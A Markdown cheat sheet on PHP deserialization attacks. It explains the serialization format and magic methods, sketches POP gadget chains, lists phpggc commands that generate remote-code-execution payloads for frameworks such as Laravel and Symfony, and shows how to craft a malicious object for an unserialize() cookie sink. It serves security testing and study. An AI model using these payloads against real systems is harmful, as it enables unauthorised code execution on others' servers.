# PHP Deserialization

## PHP Serialization Format
```
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
O:      Object
4:       Class name length
"User":  Class name
2:       Number of properties
s:4:"name";   String property name
s:5:"admin";  String property value
```

## Magic Methods
```
__construct()    # Object creation
__destruct()     # Object destruction
__wakeup()       # Unserialization
__toString()     # String conversion
__call()         # Method call
__get()          # Property access
__set()          # Property assignment
```

## POP Chain Construction

### Step 1: Find Entry Points
```php
# Look for unserialize() calls
# Entry: cookie, POST body, file content
```

### Step 2: Find Gadget Classes
```php
# Classes with useful magic methods
class Logger {
    public $logfile;
    public $content;
    public function __destruct() {
        file_put_contents($this->logfile, $this->content);
    }
}
```

### Step 3: Chain to Sink
```php
# Entry → Gadget → Sink (RCE/file_write/system)
```

## phpggc Usage
```bash
# List available gadgets
phpggc -l

# Generate payload
phpggc Monolog/RCE1 system 'id'
phpggc Laravel/RCE1 system 'id'
phpggc Symfony/RCE1 system 'id'
phpggc ThinkPHP/RCE1 system 'id'
phpggc CodeIgniter/RCE1 system 'id'
```

## Common Gadget Chains
```
Monolog/RCE1          # Monolog logger
Laravel/RCE1          # Laravel framework
Symfony/RCE1          # Symfony framework
ThinkPHP/RCE1         # ThinkPHP framework
CodeIgniter/RCE1      # CodeIgniter framework
WordPress/RCE1        # WordPress
Drupal/RCE1           # Drupal
Joomla/RCE1           # Joomla
```

## PHP Object Injection
```php
# If code has:
unserialize($_COOKIE['user']);

# Craft malicious object
class User {
    public $name = 'admin';
    public $role = 'admin';
}
echo urlencode(serialize(new User()));
```
